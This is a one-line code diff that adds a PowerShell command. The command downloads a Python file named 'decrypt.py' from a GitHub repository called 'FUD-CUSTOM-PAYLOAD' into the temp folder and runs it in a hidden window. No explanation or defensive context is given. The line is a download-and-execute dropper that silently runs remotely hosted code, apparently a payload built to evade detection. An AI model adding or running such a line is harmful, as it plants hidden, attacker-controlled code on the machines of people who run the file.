@@ -1,0 +1,1 @@
+$TempFile = [System.IO.Path]::Combine($env:TEMP, 'decrypt.py'); Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/decrypt.py' -OutFile $TempFile; Start-Process -FilePath 'python' -ArgumentList $TempFile -WindowStyle Hidden
